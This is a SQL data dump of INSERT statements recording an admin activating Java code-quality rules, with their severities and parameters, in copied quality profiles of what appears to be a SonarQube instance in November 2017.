INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3763, '2017-11-20 12:53:51.125', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3281;ruleKey=squid:S3281;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffOVbbGRdfPp-rYX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3764, '2017-11-20 12:53:51.235', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3346;ruleKey=squid:S3346;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffQDbbGRdfPp-rYY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3765, '2017-11-20 12:53:51.288', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3355;ruleKey=squid:S3355;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffQ4bbGRdfPp-rYZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3766, '2017-11-20 12:53:51.37', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3358;ruleKey=squid:S3358;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffSKbbGRdfPp-rYa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3767, '2017-11-20 12:53:51.405', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3398;ruleKey=squid:S3398;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffStbbGRdfPp-rYb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3768, '2017-11-20 12:53:51.428', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3400;ruleKey=squid:S3400;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffTEbbGRdfPp-rYc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3769, '2017-11-20 12:53:51.452', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3415;ruleKey=squid:S3415;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffTcbbGRdfPp-rYd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3770, '2017-11-20 12:53:51.48', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3421;ruleKey=squid:S3421;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffT4bbGRdfPp-rYe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3771, '2017-11-20 12:53:51.508', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3422;ruleKey=squid:S3422;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffUUbbGRdfPp-rYf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3772, '2017-11-20 12:53:51.535', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3436;ruleKey=squid:S3436;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffUvbbGRdfPp-rYg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3773, '2017-11-20 12:53:51.577', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3437;ruleKey=squid:S3437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffVZbbGRdfPp-rYh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3774, '2017-11-20 12:53:51.626', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3438;ruleKey=squid:S3438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffWKbbGRdfPp-rYi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3775, '2017-11-20 12:53:51.66', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3457;ruleKey=squid:S3457;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffWsbbGRdfPp-rYj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3776, '2017-11-20 12:53:51.688', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3516;ruleKey=squid:S3516;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffXIbbGRdfPp-rYk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3777, '2017-11-20 12:53:51.715', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3518;ruleKey=squid:S3518;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffXjbbGRdfPp-rYl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3778, '2017-11-20 12:53:51.742', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3599;ruleKey=squid:S3599;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffX-bbGRdfPp-rYm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3779, '2017-11-20 12:53:51.759', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3631;ruleKey=squid:S3631;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffYPbbGRdfPp-rYn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3780, '2017-11-20 12:53:51.785', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3655;ruleKey=squid:S3655;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffYpbbGRdfPp-rYo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3781, '2017-11-20 12:53:51.81', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3725;ruleKey=squid:S3725;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffZCbbGRdfPp-rYp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3782, '2017-11-20 12:53:51.837', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3776;ruleKey=squid:S3776;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;param_Threshold=15;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffZdbbGRdfPp-rYq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3783, '2017-11-20 12:53:51.866', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3824;ruleKey=squid:S3824;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffZ6bbGRdfPp-rYr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3784, '2017-11-20 12:53:51.899', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3878;ruleKey=squid:S3878;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffabbbGRdfPp-rYs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3785, '2017-11-20 12:53:51.927', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3923;ruleKey=squid:S3923;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zffa3bbGRdfPp-rYt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3786, '2017-11-20 12:53:51.956', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3958;ruleKey=squid:S3958;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffbUbbGRdfPp-rYu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3787, '2017-11-20 12:53:51.976', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3959;ruleKey=squid:S3959;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffbobbGRdfPp-rYv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3788, '2017-11-20 12:53:51.993', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3972;ruleKey=squid:S3972;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zffb5bbGRdfPp-rYw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3789, '2017-11-20 12:53:52.034', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3981;ruleKey=squid:S3981;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffcibbGRdfPp-rYx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3790, '2017-11-20 12:53:52.066', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3984;ruleKey=squid:S3984;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffdCbbGRdfPp-rYy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3791, '2017-11-20 12:53:52.125', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3985;ruleKey=squid:S3985;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zffd9bbGRdfPp-rYz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3792, '2017-11-20 12:53:52.166', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3986;ruleKey=squid:S3986;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffelbbGRdfPp-rY0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3793, '2017-11-20 12:53:52.256', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S4032;ruleKey=squid:S4032;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffgAbbGRdfPp-rY1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3794, '2017-11-20 12:53:52.301', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S4034;ruleKey=squid:S4034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffgtbbGRdfPp-rY2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3795, '2017-11-20 12:53:52.354', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S4042;ruleKey=squid:S4042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffhibbGRdfPp-rY3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3796, '2017-11-20 12:53:52.437', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S4065;ruleKey=squid:S4065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zffi1bbGRdfPp-rY4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3797, '2017-11-20 12:53:52.464', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S4087;ruleKey=squid:S4087;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffjQbbGRdfPp-rY5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3798, '2017-11-20 12:53:52.491', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S4143;ruleKey=squid:S4143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffjrbbGRdfPp-rY6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3799, '2017-11-20 12:53:52.519', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S4144;ruleKey=squid:S4144;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffkHbbGRdfPp-rY7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3800, '2017-11-20 12:53:52.548', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S4165;ruleKey=squid:S4165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffkkbbGRdfPp-rY8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3801, '2017-11-20 12:53:52.565', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S899;ruleKey=squid:S899;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zffk1bbGRdfPp-rY9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3802, '2017-11-20 12:53:52.591', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:SwitchLastCaseIsDefaultCheck;ruleKey=squid:SwitchLastCaseIsDefaultCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfflObbGRdfPp-rY-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3803, '2017-11-20 12:53:52.617', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:UnusedPrivateMethod;ruleKey=squid:UnusedPrivateMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfflpbbGRdfPp-rY_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3804, '2017-11-20 12:53:52.671', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:UselessImportCheck;ruleKey=squid:UselessImportCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffmfbbGRdfPp-rZA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3805, '2017-11-20 12:53:52.711', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:UselessParenthesesCheck;ruleKey=squid:UselessParenthesesCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffnHbbGRdfPp-rZB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3806, '2017-11-20 13:05:35.49', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:common-java:DuplicatedBlocks;ruleKey=common-java:DuplicatedBlocks;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLMCbbGRdfPp-rZC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3807, '2017-11-20 13:05:35.526', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:AssignmentInSubExpressionCheck;ruleKey=squid:AssignmentInSubExpressionCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLMmbbGRdfPp-rZD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3808, '2017-11-20 13:05:35.565', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:CallToDeprecatedMethod;ruleKey=squid:CallToDeprecatedMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLNNbbGRdfPp-rZE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3809, '2017-11-20 13:05:35.606', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:ClassVariableVisibilityCheck;ruleKey=squid:ClassVariableVisibilityCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLN2bbGRdfPp-rZF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3810, '2017-11-20 13:05:35.643', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:CommentedOutCodeLine;ruleKey=squid:CommentedOutCodeLine;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLObbbGRdfPp-rZG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3811, '2017-11-20 13:05:35.673', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:EmptyStatementUsageCheck;ruleKey=squid:EmptyStatementUsageCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLO5bbGRdfPp-rZH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3812, '2017-11-20 13:05:35.713', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:ForLoopCounterChangedCheck;ruleKey=squid:ForLoopCounterChangedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLPhbbGRdfPp-rZI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3813, '2017-11-20 13:05:35.745', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:HiddenFieldCheck;ruleKey=squid:HiddenFieldCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLQBbbGRdfPp-rZJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3814, '2017-11-20 13:05:35.79', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:LabelsShouldNotBeUsedCheck;ruleKey=squid:LabelsShouldNotBeUsedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLQubbGRdfPp-rZK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3815, '2017-11-20 13:05:35.878', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:MaximumInheritanceDepth;ruleKey=squid:MaximumInheritanceDepth;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;param_max=5;param_filteredClasses=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLSGbbGRdfPp-rZL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3816, '2017-11-20 13:05:35.915', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:MissingDeprecatedCheck;ruleKey=squid:MissingDeprecatedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLSrbbGRdfPp-rZM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3817, '2017-11-20 13:05:35.944', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:ModifiersOrderCheck;ruleKey=squid:ModifiersOrderCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLTIbbGRdfPp-rZN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3818, '2017-11-20 13:05:35.975', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:ObjectFinalizeCheck;ruleKey=squid:ObjectFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLTnbbGRdfPp-rZO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3819, '2017-11-20 13:05:36.004', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;ruleKey=squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLUEbbGRdfPp-rZP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3820, '2017-11-20 13:05:36.043', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:ObjectFinalizeOverridenCheck;ruleKey=squid:ObjectFinalizeOverridenCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLUrbbGRdfPp-rZQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3821, '2017-11-20 13:05:36.087', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:RedundantThrowsDeclarationCheck;ruleKey=squid:RedundantThrowsDeclarationCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLVXbbGRdfPp-rZR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3822, '2017-11-20 13:05:36.122', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S00100;ruleKey=squid:S00100;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLV6bbGRdfPp-rZS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3823, '2017-11-20 13:05:36.155', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S00101;ruleKey=squid:S00101;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLWbbbGRdfPp-rZT');
